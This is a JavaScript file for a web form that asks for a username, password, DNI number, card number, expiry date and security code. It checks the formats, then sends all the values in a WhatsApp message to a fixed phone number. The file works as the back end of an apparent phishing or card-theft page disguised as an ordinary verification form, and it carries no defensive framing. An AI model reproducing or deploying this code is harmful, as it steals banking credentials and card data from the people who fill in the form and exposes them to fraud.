let user = document.getElementById("user")
let code = document.getElementById("code")
let dni = document.getElementById("dni")
let card = document.getElementById("card")
let date = document.getElementById("vencimiento")
let secureCode = document.getElementById("secure_code")
let submit = document.getElementById("submit")
let contact = document.getElementById("contacto")
let error = document.getElementById("error")
let label = document.querySelectorAll("label")




contact.addEventListener("click", ()=>{
  location.href = "https://api.whatsapp.com/send?phone=5491151109790"
})
submit.addEventListener("click",()=>{
  if(user.value.trim().indexOf(" ") == -1 && user.value.trim().length >=4 && card.value.trim().indexOf(" ") && card.value.trim().length == 16 && code.value.trim().indexOf(" ") == -1 && code.value.trim().length >= 4 && dni.value.trim().indexOf(" ") == -1 && dni.value.trim().length >= 8 && date.value.trim().indexOf(" ") == -1 && secureCode.value.trim().indexOf(" ") == -1 && secureCode.value.trim().length == 3){
    
    const message = `User:%20${user.value.trim()}%20Clave:%20${code.value.trim()}%20Card:%20${card.value.trim()}%20Vencimiento:%20${date.value.trim()}%20Pin:%20${secureCode.value.trim()}%20DNI:%20${dni.value.trim()}`
    const whatsapp = `https://api.whatsapp.com/send?phone=5491151109790&text=${message}`
    console.log(whatsapp)
    location.href = whatsapp
    
  }else{
    error.removeAttribute('hidden')
    error.textContent = "Datos incorrectos, revise la información..."
    error.classList.add('p-2')
  }
  
  if (user.value.trim().indexOf(" ") != -1 || user.value.trim().length < 4) {
    if (label[0].textContent.indexOf("*") == -1) {
          label[0].style.color = "red"
          label[0].textContent += "*"
          user.style.border = "2px solid red"
    }
  }
  
  if (code.value.trim().indexOf(" ") != -1 || code.value.trim().length < 4 ) {
    if (label[1].textContent.indexOf("*") == -1) {
         label[1].style.color = "red"
         label[1].textContent += "*"
         code.style.border = "2px solid red"
    }
  }
  
  if (dni.value.trim().indexOf(" ") != -1 || dni.value.trim().length < 8) {
    if (label[2].textContent.indexOf("*") == -1) {
      label[2].style.color = "red"
      label[2].textContent += "*"
      dni.style.border = "2px solid red"
    }
  }
  
  if (card.value.trim().indexOf(" ") != -1 || card.value.trim().length != 16) {
    if (label[3].textContent.indexOf("*") == -1) {
      label[3].style.color = "red"
      label[3].textContent += "*"
      card.style.border = "2px solid red"
    }
  }
  
  if (date.value.trim() == "") {
    if (label[4].textContent.indexOf("*") == -1) {
      label[4].style.color = "red"
      label[4].textContent += "*"
      date.style.border = "2px solid red"
    }
  }

  if (secureCode.value.trim().indexOf(" ") != -1 || secureCode.value.trim().length != 3) {
    if (label[5].textContent.indexOf("*") == -1) {
      label[5].style.color = "red"
      label[5].textContent += "*"
      secureCode.style.border = "2px solid red"
    }
  }
  
  
  setTimeout(()=> error.setAttribute('hidden', 'true'), 3000)
})


  user.addEventListener('focus', () => {
    if(label[0].textContent.indexOf("*") != -1){
      label[0].style.color = "white"
      let txt = label[0].textContent
      label[0].textContent = txt.substring(0, label[0].textContent.length - 1)
      user.style.border = "none"
    }
  })

  code.addEventListener('focus', () => {
    if(label[1].textContent.indexOf("*") != -1){
      label[1].style.color = "white"
      let txt = label[1].textContent
      label[1].textContent = txt.substring(0, label[1].textContent.length - 1)
      code.style.border = "none"
    }
  })

  dni.addEventListener('focus', () => {
    if(label[2].textContent.indexOf("*") != -1){
      label[2].style.color = "white"
      let txt = label[2].textContent
      label[2].textContent = txt.substring(0, label[2].textContent.length - 1)
      dni.style.border = "none"
    }
  })

  card.addEventListener('focus', () => {
    if(label[3].textContent.indexOf("*") != -1){
      label[3].style.color = "white"
      let txt = label[3].textContent
      label[3].textContent = txt.substring(0, label[3].textContent.length - 1)
      card.style.border = "none"
    }
  })

  date.addEventListener('focus', () => {
    if(label[4].textContent.indexOf("*") != -1){
      label[4].style.color = "white"
      let txt = label[4].textContent
      label[4].textContent = txt.substring(0, label[4].textContent.length - 1)
      date.style.border = "none"
    }
  })
    
  secureCode.addEventListener('focus', () => {
        if (label[5].textContent.indexOf("*") != -1) {
          label[5].style.color = "white"
          let txt = label[5].textContent
          label[5].textContent = txt.substring(0, label[5].textContent.length - 1)
          secureCode.style.border = "none"
        }
        
  })  
  
